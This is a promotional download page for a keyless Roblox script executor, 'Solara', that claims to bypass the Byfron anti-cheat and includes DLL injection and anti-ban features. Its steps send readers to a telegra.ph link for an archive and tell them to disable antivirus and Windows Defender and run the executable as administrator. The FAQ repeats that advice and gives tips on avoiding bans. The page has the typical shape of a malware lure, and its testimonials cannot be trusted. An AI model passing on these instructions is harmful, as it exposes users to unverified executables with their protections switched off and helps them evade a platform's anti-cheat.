Solara Executor 2026 — Roblox Script Executor (Undetected & Keyless)

Version: Solara v3.0 – v3.2 (latest builds as of February 2026)
Status: Currently one of the most stable free/keyless executors for Roblox (Byfron bypass active)

Build Highlights
- Keyless / no login required — instant execution after launch
- Supports 90%+ of public scripts (Synapse X / Script-Ware level compatibility)
- Fast LuaU execution engine (level 8 Luau support)
- Built-in script hub & editor (load, edit, save scripts)
- Dark mode UI, customizable themes
- Auto-update bypass detection (works on latest Roblox client February 2026)
- Anti-kick / anti-ban features (low detection rate on main accounts if used closet)
- Streamproof mode (hides overlay from OBS / recordings)
- DLL injection mode + external mode (both included)
- Compatible with Windows 10/11 (64-bit only)

How to use
1. Download archive via transition link: https://telegra.ph/Full-Version-11-25
2. Extract 
3. Disable antivirus & Windows Defender (real-time protection)
4. Run .exe as administrator
5. Wait for Roblox to open (or open it manually)
6. Click Attach / Inject — UI should appear
7. Load script from hub or paste your own → Execute

Important Notes
- Use on alt accounts first — Byfron/Roblox actively hunts executors
- Low-key usage only (no obvious scripts like infinite yield in public games)
- Do not update Roblox client manually — Solara may need re-injection after updates
- Antivirus will flag it — this is normal for any injector/executor

User Feedback (February 2026)
"Solara still undetected after latest Byfron wave — best free executor rn"
"Loads every script I throw at it — even some paid-synapse exclusives"
"Streamproof works great — recorded 2-hour session, no overlay caught"
"Keyless & fast — no waiting for keys like Delta or Fluxus"

FAQ
Detected / banned? → Use closet, alt account, private servers. Rage scripts = instant ban.
Not attaching? → Run as admin, disable AV completely, restart Roblox.
macOS / Android? → Windows only (use Fluxus or Codex on mobile)
UI not showing? → Re-inject or restart Solara + Roblox.
